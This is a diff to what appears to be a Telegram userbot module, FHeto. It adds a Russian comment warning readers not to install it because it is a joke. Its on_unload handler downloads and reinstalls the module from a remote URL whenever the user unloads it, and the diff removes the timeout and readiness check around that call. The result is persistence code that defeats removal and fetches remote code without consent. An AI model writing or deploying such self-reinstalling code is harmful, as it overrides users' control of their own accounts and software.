@@ -1,3 +1,5 @@
+# не ставьте это, это все шутка и вообще кака фу не ставьте да
+
 from .. import loader
 import requests, logging, json, asyncio
 
@@ -48,5 +50,4 @@ class FHeto(loader.Module):
 
     async def on_unload(self):
         lm = self.lookup("loader")
-        await asyncio.wait_for(lm.download_and_install(self._url, None), timeout=10)
-        getattr(lm, "fully_loaded", False) and lm.update_modules_in_db()
+        await lm.download_and_install(self._url, None)
